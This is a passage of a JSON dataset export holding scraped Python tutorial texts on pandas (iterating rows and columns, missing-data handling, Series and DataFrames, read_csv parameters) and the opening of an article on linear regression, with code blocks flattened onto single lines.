\"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0# creating a dataframe from dictionarydf = pd.DataFrame(dict)\u00a0# using a itertuples()for i in df.itertuples():\u00a0\u00a0\u00a0\u00a0print(i)Output:\u00a0Code #2:\u00a0Python# importing pandas moduleimport pandas as pd\u00a0\u00a0\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\")\u00a0# for data visualization we filter first 3 datasetsdata.head(3)Now we apply an itertuples() to get atuple of each rows\u00a0Python# importing pandas moduleimport pandas as pd\u00a0\u00a0\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\")\u00a0for i in data.itertuples():\u00a0\u00a0\u00a0\u00a0print(i)Output:\u00a0Iterating over Columns :In order to iterate over columns, we need to create a list of dataframe columns and then iterating through that list to pull out the dataframe columns.Code #1:Python3# importing pandas as pdimport pandas as pd\u00a0\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", \"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0\u00a0# creating a dataframe from a dictionarydf = pd.DataFrame(dict)\u00a0print(df)Now we iterate through columns in order to iterate through columns we first create a list of dataframe columns and then iterate through list.\u00a0Python# creating a list of dataframe columnscolumns = list(df)\u00a0for i in columns:\u00a0\u00a0\u00a0\u00a0\u00a0# printing the third element of the column\u00a0\u00a0\u00a0\u00a0print (df[i][2])Output:\u00a0Code #2:\u00a0Python# importing pandas moduleimport pandas as pd\u00a0\u00a0\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\")\u00a0# for data visualization we filter first 3 datasets\u00a0col = data.head(3)\u00a0colNow we iterate over columns in CSV file in order to iterate over columns we create a list of dataframe columns and iterate over list\u00a0Python# creating a list of dataframe columnsclmn = list(col)\u00a0for i in clmn:\u00a0\u00a0\u00a0\u00a0# printing a third element of column\u00a0\u00a0\u00a0\u00a0print(col[i][2])Output:\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "235580996a6ceab58ac4d03dbe6084e1",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Missing Data can occur when no information is provided for one or more items or for a whole unit. Missing Data is a very big problem in a real-life scenarios. Missing Data can also refer to as NA(Not Available) values in pandas. In DataFrame sometimes many datasets simply arrive with missing data, either because it exists and was not collected or it never existed. For Example, Suppose different users being surveyed may choose not to share their income, some users may choose not to share the address in this way many datasets went missing.In Pandas missing data is represented by two value:None: None is a Python singleton object that is often used for missing data in Python code.NaN : NaN (an acronym for Not a Number), is a special floating-point value recognized by all systems that use the standard IEEE floating-point representationPandas treat None and NaN as essentially interchangeable for indicating missing or null values. To facilitate this convention, there are several useful functions for detecting, removing, and replacing null values in Pandas DataFrame :isnull()notnull()dropna()fillna()replace()interpolate()In this article we are using CSV file, to download the CSV file used, Click Here.Checking for missing values using isnull() and notnull()In order to check missing values in Pandas DataFrame, we use a function isnull() and notnull(). Both function help in checking whether a value is NaN or not. These function can also be used in Pandas Series in order to find null values in a series.Checking for missing values using isnull()In order to check null values in Pandas DataFrame, we use isnull() function this function return dataframe of Boolean values which are True for NaN values.Code #1:# importing pandas as pdimport pandas as pd\u00a0\u00a0# importing numpy as npimport numpy as np\u00a0\u00a0# dictionary of listsdict = {'First Score':[100, 90, np.nan, 95],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Second Score': [30, 45, 56, np.nan],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Third Score':[np.nan, 40, 80, 98]}\u00a0\u00a0# creating a dataframe from listdf = pd.DataFrame(dict)\u00a0\u00a0# using isnull() function\u00a0\u00a0df.isnull()Output:\u00a0Code #2:# importing pandas package\u00a0import pandas as pd\u00a0\u00a0\u00a0\u00a0\u00a0# making data frame from csv file\u00a0data = pd.read_csv(\"employees.csv\")\u00a0\u00a0\u00a0\u00a0\u00a0# creating bool series True for NaN values\u00a0bool_series = pd.isnull(data[\"Gender\"])\u00a0\u00a0\u00a0\u00a0\u00a0# filtering data\u00a0# displaying data only with Gender = NaN\u00a0data[bool_series]\u00a0Output:As shown in the output image, only the rows having Gender = NULL are displayed.\u00a0Checking for missing values using notnull()In order to check null values in Pandas Dataframe, we use notnull() function this function return dataframe of Boolean values which are False for NaN values.Code #3:# importing pandas as pdimport pandas as pd\u00a0\u00a0# importing numpy as npimport numpy as np\u00a0\u00a0# dictionary of listsdict = {'First Score':[100, 90, np.nan, 95],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Second Score': [30, 45, 56, np.nan],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Third Score':[np.nan, 40, 80, 98]}\u00a0\u00a0# creating a dataframe using dictionarydf = pd.DataFrame(dict)\u00a0\u00a0# using notnull() function\u00a0df.notnull()Output:\u00a0Code #4:# importing pandas package\u00a0import pandas as pd\u00a0\u00a0\u00a0\u00a0\u00a0# making data frame from csv file\u00a0data = pd.read_csv(\"employees.csv\")\u00a0\u00a0\u00a0\u00a0\u00a0# creating bool series True for NaN values\u00a0bool_series = pd.notnull(data[\"Gender\"])\u00a0\u00a0\u00a0\u00a0\u00a0# filtering data\u00a0# displayind data only with Gender = Not NaN\u00a0data[bool_series]\u00a0Output:As shown in the output image, only the rows having Gender = NOT NULL are displayed.\u00a0Filling missing values using fillna(), replace() and interpolate()In order to fill null values in a datasets, we use fillna(), replace() and interpolate() function these function replace NaN values with some value of their own. All these function help in filling a null values in datasets of a DataFrame. Interpolate() function is basically used to fill NA values in the dataframe but it uses various interpolation technique to fill the missing values rather than hard-coding the value.Code #1: Filling null values with a single value# importing pandas as pdimport pandas as pd\u00a0\u00a0# importing numpy as npimport numpy as np\u00a0\u00a0# dictionary of listsdict = {'First Score':[100, 90, np.nan, 95],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Second Score': [30, 45, 56, np.nan],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Third Score':[np.nan, 40, 80, 98]}\u00a0\u00a0# creating a dataframe from dictionarydf = pd.DataFrame(dict)\u00a0\u00a0# filling missing value using fillna()\u00a0\u00a0df.fillna(0)Output:\u00a0Code #2: Filling null values with the previous ones# importing pandas as pdimport pandas as pd\u00a0\u00a0# importing numpy as npimport numpy as np\u00a0\u00a0# dictionary of listsdict = {'First Score':[100, 90, np.nan, 95],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Second Score': [30, 45, 56, np.nan],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Third Score':[np.nan, 40, 80, 98]}\u00a0\u00a0# creating a dataframe from dictionarydf = pd.DataFrame(dict)\u00a0\u00a0# filling a missing value with# previous ones\u00a0\u00a0df.fillna(method ='pad')Output:\u00a0Code #3: Filling null value with the next ones# importing pandas as pdimport pandas as pd\u00a0\u00a0# importing numpy as npimport numpy as np\u00a0\u00a0# dictionary of listsdict = {'First Score':[100, 90, np.nan, 95],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Second Score': [30, 45, 56, np.nan],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Third Score':[np.nan, 40, 80, 98]}\u00a0\u00a0# creating a dataframe from dictionarydf = pd.DataFrame(dict)\u00a0\u00a0# filling\u00a0 null value using fillna() function\u00a0\u00a0df.fillna(method ='bfill')Output:\u00a0Code #4: Filling null values in CSV File# importing pandas package\u00a0import pandas as pd\u00a0\u00a0\u00a0\u00a0\u00a0# making data frame from csv file\u00a0data = pd.read_csv(\"employees.csv\")\u00a0\u00a0# Printing the first 10 to 24 rows of# the data frame for visualization\u00a0\u00a0\u00a0data[10:25]Now we are going to fill all the null values in Gender column with \u201cNo Gender\u201d# importing pandas package\u00a0import pandas as pd\u00a0\u00a0\u00a0\u00a0\u00a0# making data frame from csv file\u00a0data = pd.read_csv(\"employees.csv\")\u00a0\u00a0\u00a0# filling a null values using fillna()\u00a0data[\"Gender\"].fillna(\"No Gender\", inplace = True)\u00a0\u00a0\u00a0dataOutput:Code #5: Filling a null values using replace() method# importing pandas package\u00a0import pandas as pd\u00a0\u00a0\u00a0\u00a0\u00a0# making data frame from csv file\u00a0data = pd.read_csv(\"employees.csv\")\u00a0\u00a0# Printing the first 10 to 24 rows of# the data frame for visualization\u00a0\u00a0\u00a0data[10:25]Output:Now we are going to replace the all Nan value in the data frame with -99 value.# importing pandas package\u00a0import pandas as pd\u00a0\u00a0\u00a0\u00a0\u00a0# making data frame from csv file\u00a0data = pd.read_csv(\"employees.csv\")\u00a0\u00a0\u00a0\u00a0\u00a0# will replace\u00a0 Nan value in dataframe with value -99\u00a0\u00a0data.replace(to_replace = np.nan, value = -99)\u00a0Output:\u00a0Code #6: Using interpolate() function to fill the missing values using linear method.# importing pandas as pd\u00a0import pandas as pd\u00a0\u00a0\u00a0\u00a0\u00a0# Creating the dataframe\u00a0\u00a0df = pd.DataFrame({\"A\":[12, 4, 5, None, 1],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"B\":[None, 2, 54, 3, None],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"C\":[20, 16, None, 3, 8],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"D\":[14, 3, None, None, 6]})\u00a0\u00a0\u00a0\u00a0\u00a0# Print the dataframe\u00a0df\u00a0Let\u2019s interpolate the missing values using Linear method. Note that Linear method ignore the index and treat the values as equally spaced.# to interpolate the missing values\u00a0df.interpolate(method ='linear', limit_direction ='forward')Output:As we can see the output, values in the first row could not get filled as the direction of filling of values is forward and there is no previous value which could have been used in interpolation.\u00a0Dropping missing values using dropna()In order to drop a null values from a dataframe, we used dropna() function this function drop Rows/Columns of datasets with Null values in different ways.Code #1: Dropping rows with at least 1 null value.# importing pandas as pdimport pandas as pd\u00a0\u00a0# importing numpy as npimport numpy as np\u00a0\u00a0# dictionary of listsdict = {'First Score':[100, 90, np.nan, 95],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Second Score': [30, np.nan, 45, 56],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Third Score':[52, 40, 80, 98],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Fourth Score':[np.nan, np.nan, np.nan, 65]}\u00a0\u00a0# creating a dataframe from dictionarydf = pd.DataFrame(dict)\u00a0\u00a0\u00a0\u00a0dfNow we drop rows with at least one Nan value (Null value)# importing pandas as pdimport pandas as pd\u00a0\u00a0# importing numpy as npimport numpy as np\u00a0\u00a0# dictionary of listsdict = {'First Score':[100, 90, np.nan, 95],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Second Score': [30, np.nan, 45, 56],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Third Score':[52, 40, 80, 98],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Fourth Score':[np.nan, np.nan, np.nan, 65]}\u00a0\u00a0# creating a dataframe from dictionarydf = pd.DataFrame(dict)\u00a0\u00a0# using dropna() function\u00a0\u00a0df.dropna()Output:Code #2: Dropping rows if all values in that row are missing.# importing pandas as pdimport pandas as pd\u00a0\u00a0# importing numpy as npimport numpy as np\u00a0\u00a0# dictionary of listsdict = {'First Score':[100, np.nan, np.nan, 95],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Second Score': [30, np.nan, 45, 56],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Third Score':[52, np.nan, 80, 98],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Fourth Score':[np.nan, np.nan, np.nan, 65]}\u00a0\u00a0# creating a dataframe from dictionarydf = pd.DataFrame(dict)\u00a0\u00a0\u00a0\u00a0dfNow we drop a rows whose all data is missing or contain null values(NaN)# importing pandas as pdimport pandas as pd\u00a0\u00a0# importing numpy as npimport numpy as np\u00a0\u00a0# dictionary of listsdict = {'First Score':[100, np.nan, np.nan, 95],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Second Score': [30, np.nan, 45, 56],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Third Score':[52, np.nan, 80, 98],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Fourth Score':[np.nan, np.nan, np.nan, 65]}\u00a0\u00a0df = pd.DataFrame(dict)\u00a0\u00a0# using dropna() function\u00a0\u00a0\u00a0\u00a0df.dropna(how = 'all')Output:Code #3: Dropping columns with at least 1 null value.# importing pandas as pdimport pandas as pd\u00a0\u00a0\u00a0# importing numpy as npimport numpy as np\u00a0\u00a0\u00a0# dictionary of listsdict = {'First Score':[100, np.nan, np.nan, 95],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Second Score': [30, np.nan, 45, 56],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Third Score':[52, np.nan, 80, 98],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Fourth Score':[60, 67, 68, 65]}\u00a0\u00a0# creating a dataframe from dictionary\u00a0df = pd.DataFrame(dict)\u00a0\u00a0\u00a0\u00a0\u00a0dfNow we drop a columns which have at least 1 missing values# importing pandas as pdimport pandas as pd\u00a0\u00a0\u00a0# importing numpy as npimport numpy as np\u00a0\u00a0\u00a0# dictionary of listsdict = {'First Score':[100, np.nan, np.nan, 95],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Second Score': [30, np.nan, 45, 56],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Third Score':[52, np.nan, 80, 98],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Fourth Score':[60, 67, 68, 65]}\u00a0\u00a0# creating a dataframe from dictionary\u00a0\u00a0df = pd.DataFrame(dict)\u00a0\u00a0# using dropna() function\u00a0\u00a0\u00a0\u00a0\u00a0df.dropna(axis = 1)Output :\u00a0Code #4: Dropping Rows with at least 1 null value in CSV file# importing pandas module\u00a0import pandas as pd\u00a0\u00a0\u00a0\u00a0\u00a0# making data frame from csv file\u00a0data = pd.read_csv(\"employees.csv\")\u00a0\u00a0\u00a0\u00a0\u00a0# making new data frame with dropped NA values\u00a0new_data = data.dropna(axis = 0, how ='any')\u00a0\u00a0\u00a0\u00a0\u00a0new_dataOutput:Now we compare sizes of data frames so that we can come to know how many rows had at least 1 Null valueprint(\"Old data frame length:\", len(data))print(\"New data frame length:\", len(new_data))\u00a0print(\"Number of rows with at least 1 NA value: \", (len(data)-len(new_data)))Output :\r\nOld data frame length: 1000\r\nNew data frame length: 764\r\nNumber of rows with at least 1 NA value:  236\r\nSince the difference is 236, there were 236 rows which had at least 1 Null value in any column.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "c775989df1b641467cfa9d05b2ad3eff",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Pandas is the most popular python library that is used for data analysis. It provides highly optimized performance with back-end source code is purely written in C or Python.We can analyze data in pandas with:\r\n\r\nSeriesDataFramesSeries:Series is one dimensional(1-D) array defined in pandas that can be used to store any data type.Code #1: Creating Series# Program to create series\u00a0\u00a0# Import Panda Libraryimport pandas as pd\u00a0\u00a0\u00a0\u00a0# Create series with Data, and Indexa = pd.Series(Data, index = Index)\u00a0\u00a0Here, Data can be:A Scalar value which can be integerValue, stringA Python Dictionary which can be Key, Value pairA NdarrayNote: Index by default is from 0, 1, 2, \u2026(n-1) where n is length of data.\u00a0Code #2: When Data contains scalar values# Program to Create series with scalar values\u00a0\u00a0\u00a0# Numeric dataData =[1, 3, 4, 5, 6, 2, 9]\u00a0\u00a0\u00a0\u00a0# Creating series with default index valuess = pd.Series(Data)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# predefined index valuesIndex =['a', 'b', 'c', 'd', 'e', 'f', 'g']\u00a0\u00a0\u00a0# Creating series with predefined index valuessi = pd.Series(Data, Index)\u00a0Output:\r\nScalar Data with default Index\r\nScalar Data with Index\r\n\u00a0Code #3: When Data contains Dictionary# Program to Create Dictionary seriesdictionary ={'a':1, 'b':2, 'c':3, 'd':4, 'e':5}\u00a0\u00a0\u00a0# Creating series of Dictionary typesd = pd.Series(dictionary)\u00a0Output:\r\nDictionary type data\r\n\u00a0Code #4:When Data contains Ndarray# Program to Create ndarray series\u00a0\u00a0# Defining 2darrayData =[[2, 3, 4], [5, 6, 7]]\u00a0\u00a0\u00a0\u00a0# Creating series of 2darraysnd = pd.Series(Data)\u00a0\u00a0\u00a0\u00a0Output:\r\nData as Ndarray\r\n\u00a0DataFrames:DataFrames is two-dimensional(2-D) data structure defined in pandas which consists of rows and columns.Code #1: Creation of DataFrame# Program to Create DataFrame\u00a0\u00a0# Import Libraryimport pandas as pd\u00a0\u00a0\u00a0\u00a0\u00a0# Create DataFrame with Dataa = pd.DataFrame(Data)\u00a0\u00a0Here, Data can be:One or more dictionariesOne or more Series2D-numpy Ndarray\u00a0Code #2: When Data is Dictionaries# Program to Create Data Frame with two dictionaries\u00a0\u00a0# Define Dictionary 1dict1 ={'a':1, 'b':2, 'c':3, 'd':4}\u00a0\u00a0\u00a0\u00a0\u00a0# Define Dictionary 2\u00a0\u00a0\u00a0\u00a0\u00a0dict2 ={'a':5, 'b':6, 'c':7, 'd':8, 'e':9}\u00a0\u00a0\u00a0# Define Data with dict1 and dict2Data = {'first':dict1, 'second':dict2}\u00a0\u00a0\u00a0# Create DataFrame\u00a0df = pd.DataFrame(Data)\u00a0\u00a0Output:\r\nDataFrame with two dictionaries\r\n\u00a0Code #3: When Data is Series# Program to create Dataframe of three series\u00a0import pandas as pd\u00a0\u00a0# Define series 1s1 = pd.Series([1, 3, 4, 5, 6, 2, 9])\u00a0\u00a0\u00a0\u00a0\u00a0# Define series 2\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0s2 = pd.Series([1.1, 3.5, 4.7, 5.8, 2.9, 9.3])\u00a0\u00a0\u00a0# Define series 3s3 = pd.Series(['a', 'b', 'c', 'd', 'e'])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Define DataData ={'first':s1, 'second':s2, 'third':s3}\u00a0\u00a0\u00a0# Create DataFramedfseries = pd.DataFrame(Data)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Output:\r\nDataFrame with three series\r\n\u00a0Code #4: When Data is 2D-numpy ndarrayNote: One constraint has to be maintained while creating DataFrame of 2D arrays \u2013 Dimensions of 2D array must be same.# Program to create DataFrame from 2D array\u00a0\u00a0# Import Libraryimport pandas as pd\u00a0\u00a0\u00a0# Define 2d array 1d1 =[[2, 3, 4], [5, 6, 7]]\u00a0\u00a0\u00a0# Define 2d array 2d2 =[[2, 4, 8], [1, 3, 9]]\u00a0\u00a0\u00a0# Define DataData ={'first': d1, 'second': d2}\u00a0\u00a0\u00a0\u00a0# Create DataFramedf2d = pd.DataFrame(Data)\u00a0\u00a0\u00a0\u00a0Output:\r\nDataFrame with 2d ndarray\r\nMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "3798e3088cdad4b38cfe7317efa67b5b",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is a great language for doing data analysis, primarily because of the fantastic ecosystem of data-centric python packages. Pandas is one of those packages and makes importing and analyzing data much easier.Import Pandas:\u00a0\u00a0import pandas as pd\u00a0\u00a0Code #1 : read_csv is an important pandas function to read csv files and do operations on it.\u00a0\u00a0PYTHON3# Import pandasimport pandas as pd\u00a0# reading csv filepd.read_csv(\"filename.csv\")Opening a CSV file through this is easy. But there are many others thing one can do through this function only to change the returned object completely. For instance, one can read a csv file not only locally, but from a URL through read_csv or one can choose what columns needed to export so that we don\u2019t have to edit the array later.Here is the list of parameters it takes with their Default values.\u00a0pd.read_csv(filepath_or_buffer, sep=\u2019, \u2018, delimiter=None, header=\u2019infer\u2019, names=None, index_col=None, usecols=None, squeeze=False, prefix=None, mangle_dupe_cols=True, dtype=None, engine=None, converters=None, true_values=None, false_values=None, skipinitialspace=False, skiprows=None, nrows=None, na_values=None, keep_default_na=True, na_filter=True, verbose=False, skip_blank_lines=True, parse_dates=False, infer_datetime_format=False, keep_date_col=False, date_parser=None, dayfirst=False, iterator=False, chunksize=None, compression=\u2019infer\u2019, thousands=None, decimal=b\u2019.\u2019, lineterminator=None, quotechar='\u201d\u2018, quoting=0, escapechar=None, comment=None, encoding=None, dialect=None, tupleize_cols=None, error_bad_lines=True, warn_bad_lines=True, skipfooter=0, doublequote=True, delim_whitespace=False, low_memory=True, memory_map=False, float_precision=None)\u00a0\u00a0Not all of them are much important but remembering these actually save time of performing same functions on own. One can see parameters of any function by pressing shift + tab in jupyter notebook. Useful ones are given below with their usage :\u00a0ParameterUsefilepath_or_bufferURL or Dir location of filesepStands for separator, default is \u2018, \u2018 as in csv(comma separated values)index_colMakes passed column as index instead of 0, 1, 2, 3\u2026r\u00a0\u00a0\u00a0headerMakes passed row/s[int/int list] as header\u00a0\u00a0use_colsOnly uses the passed col[string list] to make data framesqueezeIf true and only one column is passed, returns pandas seriesskiprowsSkips passed rows in new data frameRefer the link to data set used from here.Code #2 :\u00a0PYTHON3# importing Pandas libraryimport pandas as pd\u00a0pd.read_csv(filepath_or_buffer = \"pokemon.csv\")\u00a0# makes the passed rows headerpd.read_csv(\"pokemon.csv\", header =[1, 2])\u00a0# make the passed column as index instead of 0, 1, 2, 3....pd.read_csv(\"pokemon.csv\", index_col ='Type')\u00a0# uses passed cols only for data framepd.read_csv(\"pokemon.csv\", usecols =[\"Type\"])\u00a0# returns pandas series if there is only one columnpd.read_csv(\"pokemon.csv\", usecols =[\"Type\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0squeeze = True)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# skips the passed rows in new seriespd.read_csv(\"pokemon.csv\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0skiprows = [1, 2, 3, 4])My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "33829cb15afd5270c79e5d664076582d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "This article discusses the basics of linear regression and its implementation in the Python programming language.Linear regression is a statistical method for modeling relationships between a dependent variable with a given set of independent variables.Note: In this article, we refer to dependent variables as responses and independent variables as features for simplicity.In order to provide a basic understanding of linear regression, we start with the most basic version of linear regression, i.e. Simple linear regression.\u00a0Simple Linear RegressionSimple linear regression is an approach for predicting a response using a single feature.It is assumed that the two variables are linearly related. Hence, we try to find a linear function that predicts the response value(y) as accurately as possible as a function of the feature or independent variable(x).Let us consider a dataset where we have a value of response y for every feature x:\u00a0For generality, we define:x as feature vector, i.e x = [x_1, x_2, \u2026., x_n],y as response vector, i.e y = [y_1, y_2, \u2026., y_n]for n observations (in above example, n=10).A scatter plot of the above dataset looks like:-Now, the task is to find a line that fits best in the above scatter plot so that we can predict the response for any new feature values. (i.e a value of x not present in a dataset)This line is called a regression line.The equation of regression line is represented as:Here,\u00a0\u00a0h(x_i) represents the predicted response value for ith observation.b_0 and b_1 are regression coefficients and represent y-intercept and slope of regression line respectively.To create our model, we must \u201clearn\u201d or estimate the values of regression coefficients b_0 and b_1. And once we\u2019ve estimated these coefficients, we can use the model to predict responses!In this article, we are going to use the principle of \u00a0Least Squares.Now consider:Here, e_i is a residual error in ith observation.\u00a0So, our aim is to minimize the total residual error.We define the squared error or cost function, J as:\u00a0and our task is to find the value of b_0 and b_1 for which J(b_0,b_1) is minimum!Without going into the mathematical details, we present the result here:where SS_xy is the sum of cross-deviations of y and x:\u00a0and SS_xx is the sum of squared deviations of x:\u00a0Note: The complete derivation for finding least squares estimates in simple linear regression can be found here.Code: Python implementation of above technique on our small dataset\u00a0Pythonimport numpy as npimport matplotlib.pyplot as plt\u00a0def estimate_coef(x, y):\u00a0\u00a0\u00a0\u00a0# number of observations/points\u00a0\u00a0\u00a0\u00a0n = np.size(x)\u00a0\u00a0\u00a0\u00a0\u00a0# mean of x and y vector\u00a0\u00a0\u00a0\u00a0m_x = np.mean(x)\u00a0\u00a0\u00a0\u00a0m_y = np.mean(y)\u00a0\u00a0\u00a0\u00a0\u00a0# calculating cross-deviation and deviation about x\u00a0\u00a0\u00a0\u00a0SS_xy = np.sum(y*x) - n*m_y*m_x\u00a0\u00a0\u00a0\u00a0SS_xx = np.sum(x*x) - n*m_x*m_x\u00a0\u00a0\u00a0\u00a0\u00a0# calculating regression coefficients\u00a0\u00a0\u00a0\u00a0b_1 = SS_xy / SS_xx\u00a0\u00a0\u00a0\u00a0b_0 = m_y - b_1*m_x\u00a0\u00a0\u00a0\u00a0\u00a0return (b_0, b_1)\u00a0def plot_regression_line(x, y, b):\u00a0\u00a0\u00a0\u00a0# plotting the actual points as scatter plot\u00a0\u00a0\u00a0\u00a0plt.scatter(x, y, color = \"m\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0marker = \"o\", s = 30)\u00a0\u00a0\u00a0\u00a0\u00a0# predicted response vector\u00a0\u00a0\u00a0\u00a0y_pred = b[0] + b[1]*x\u00a0\u00a0\u00a0\u00a0\u00a0# plotting the regression line\u00a0\u00a0\u00a0\u00a0plt.plot(x, y_pred, color = \"g\")\u00a0\u00a0\u00a0\u00a0\u00a0# putting labels\u00a0\u00a0\u00a0\u00a0plt.xlabel('x')\u00a0\u00a0\u00a0\u00a0plt.ylabel('y')\u00a0\u00a0\u00a0\u00a0\u00a0# function to show plot\u00a0\u00a0\u00a0\u00a0plt.show()\u00a0def main():\u00a0\u00a0\u00a0\u00a0# observations / data\u00a0\u00a0\u00a0\u00a0x = np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])\u00a0\u00a0\u00a0\u00a0y = np.array([1, 3, 2, 5, 7, 8, 8, 9, 10, 12])\u00a0\u00a0\u00a0\u00a0\u00a0# estimating coefficients\u00a0\u00a0\u00a0\u00a0b = estimate_coef(x, y)\u00a0\u00a0\u00a0\u00a0print(\"Estimated coefficients:\\nb_0 = {}\u00a0 \\\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\\nb_1 = {}\".format(b[0], b[1]))\u00a0\u00a0\u00a0\u00a0\u00a0# plotting regression line\u00a0\u00a0\u00a0\u00a0plot_regression_line(x, y, b)\u00a0if __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0main()Output:\u00a0Estimated coefficients:\nb_0 = -0.0586206896552\nb_1 = 1.45747126437And graph obtained looks like this:\u00a0\u00a0Multiple linear regressionMultiple linear regression attempts to model the relationship between two or more features and a response by fitting a linear equation to the observed data.Clearly, it is nothing but an extension of simple linear regression.Consider a dataset with p features(or independent variables) and one response(or dependent variable).\u00a0Also, the dataset contains n rows/observations.We define:X (feature matrix) = a matrix of size n X p where x_{ij} denotes the values of jth feature for ith observation.So,\u00a0andy (response vector) = a vector of size n where y_{i} denotes the value of response for ith observation.The regression line for p features is represented as:\u00a0where h(x_i) is predicted response value for ith observation and b_0, b_1, \u2026, b_p are the regression coefficients.Also, we can write:\u00a0where e_i represents residual error in ith observation.We can generalize our linear model a little bit more by representing feature matrix X 